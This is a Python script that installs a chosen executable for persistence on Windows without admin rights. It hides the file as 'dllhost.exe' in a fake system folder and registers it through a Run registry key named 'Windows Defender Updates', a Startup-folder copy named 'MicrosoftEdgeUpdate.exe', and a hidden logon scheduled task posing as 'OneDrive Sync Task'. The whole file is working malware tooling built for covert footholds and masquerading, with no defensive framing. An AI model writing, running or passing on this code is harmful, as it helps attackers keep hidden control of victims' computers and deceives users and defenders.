import os
import sys
import winreg
import shutil
import tempfile
import ctypes

def hide_file(file_path):
    """Set the hidden attribute on a file"""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # FILE_ATTRIBUTE_HIDDEN
        return True
    except:
        return False

def add_registry_run(target_exe, hidden=True):
    """Add executable to HKCU Run registry key"""
    try:
        # Use a common Windows-sounding name
        value_name = "Windows Defender Updates"
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, target_exe)
        winreg.CloseKey(key)
        
        if hidden:
            hide_file(target_exe)
            
        print(f"[+] Added to HKCU Run registry as '{value_name}': {target_exe}")
        return True
    except Exception as e:
        print(f"[-] Error adding to HKCU Run: {str(e)}")
        return False

def add_startup_folder(target_exe, hidden=True):
    """Copy executable to user's startup folder"""
    try:
        startup_path = os.path.join(
            os.environ['APPDATA'],
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
        
        # Use a legitimate-looking name
        startup_exe = os.path.join(startup_path, "MicrosoftEdgeUpdate.exe")
        shutil.copy2(target_exe, startup_exe)
        
        if hidden:
            hide_file(startup_exe)
            
        print(f"[+] Added to Startup folder: {startup_exe}")
        return True
    except Exception as e:
        print(f"[-] Error adding to Startup folder: {str(e)}")
        return False

def add_scheduled_task(target_exe, hidden=True):
    """Create a scheduled task to run the executable at logon (non-admin version)"""
    try:
        # Use task scheduler in user mode (doesn't require admin)
        task_name = "OneDrive Sync Task"
        xml_template = f"""
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo>
            <Description>Keeps your OneDrive files synced</Description>
          </RegistrationInfo>
          <Triggers>
            <LogonTrigger>
              <Enabled>true</Enabled>
            </LogonTrigger>
          </Triggers>
          <Principals>
            <Principal id="Author">
              <UserId>{os.environ['USERDOMAIN']}\\{os.environ['USERNAME']}</UserId>
              <LogonType>InteractiveToken</LogonType>
              <RunLevel>LeastPrivilege</RunLevel>
            </Principal>
          </Principals>
          <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
              <Duration>PT10M</Duration>
              <WaitTimeout>PT1H</WaitTimeout>
              <StopOnIdleEnd>false</StopOnIdleEnd>
              <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>false</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
          </Settings>
          <Actions Context="Author">
            <Exec>
              <Command>"{target_exe}"</Command>
            </Exec>
          </Actions>
        </Task>
        """
        
        # Save XML to temp file
        temp_xml = os.path.join(tempfile.gettempdir(), "task.xml")
        with open(temp_xml, 'w') as f:
            f.write(xml_template)
        
        # Create the task
        os.system(f'schtasks /create /xml "{temp_xml}" /tn "{task_name}" /f')
        os.remove(temp_xml)
        
        if hidden:
            hide_file(target_exe)
            
        print(f"[+] Created user-level scheduled task: {task_name}")
        return True
    except Exception as e:
        print(f"[-] Error creating scheduled task: {str(e)}")
        return False

def add_browser_helper(target_exe):
    """Add persistence through browser helper (Chrome/Firefox extensions or Edge startup pages)"""
    try:
        # Chrome extension method
        chrome_prefs_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            'Google\\Chrome\\User Data\\Default\\Preferences'
        )
        
        if os.path.exists(os.path.dirname(chrome_prefs_path)):
            # This is a simplified example - real implementation would need more work
            print("[*] Chrome detected - could implement extension-based persistence")
            # Actual implementation would require creating an extension manifest, etc.
        
        # Edge startup pages method
        edge_prefs_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            'Microsoft\\Edge\\User Data\\Default\\Preferences'
        )
        
        if os.path.exists(os.path.dirname(edge_prefs_path)):
            print("[*] Edge detected - could implement startup page persistence")
        
        print("[!] Browser helper persistence not fully implemented in this example")
        return False
    except Exception as e:
        print(f"[-] Error with browser helper method: {str(e)}")
        return False

def establish_persistence(target_exe):
    """Implement multiple non-admin persistence mechanisms"""
    print(f"[*] Establishing non-admin persistence for: {target_exe}")
    
    # Verify target exists
    if not os.path.exists(target_exe):
        print(f"[-] Target executable not found: {target_exe}")
        return False
    
    # Copy to a more persistent location
    try:
        persistent_dir = os.path.join(
            os.environ['APPDATA'],
            'Microsoft\\Windows\\System32Helper'
        )
        
        if not os.path.exists(persistent_dir):
            os.makedirs(persistent_dir)
        
        persistent_exe = os.path.join(persistent_dir, "dllhost.exe")
        shutil.copy2(target_exe, persistent_exe)
        target_exe = persistent_exe
        hide_file(persistent_exe)
        hide_file(persistent_dir)
        print(f"[+] Copied to persistent location: {target_exe}")
    except Exception as e:
        print(f"[-] Error copying executable: {str(e)}")
        return False
    
    # Apply multiple non-admin persistence techniques
    success = False
    success = add_registry_run(target_exe) or success
    success = add_startup_folder(target_exe) or success
    success = add_scheduled_task(target_exe) or success
    
    # Browser-based persistence (not fully implemented)
    # success = add_browser_helper(target_exe) or success
    
    if success:
        print("[+] Non-admin persistence established successfully")
    else:
        print("[-] Failed to establish persistence")
    
    return success

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: py {sys.argv[0]} <path_to_exe>")
        sys.exit(1)

    target_exe = os.path.abspath(sys.argv[1])
    establish_persistence(target_exe)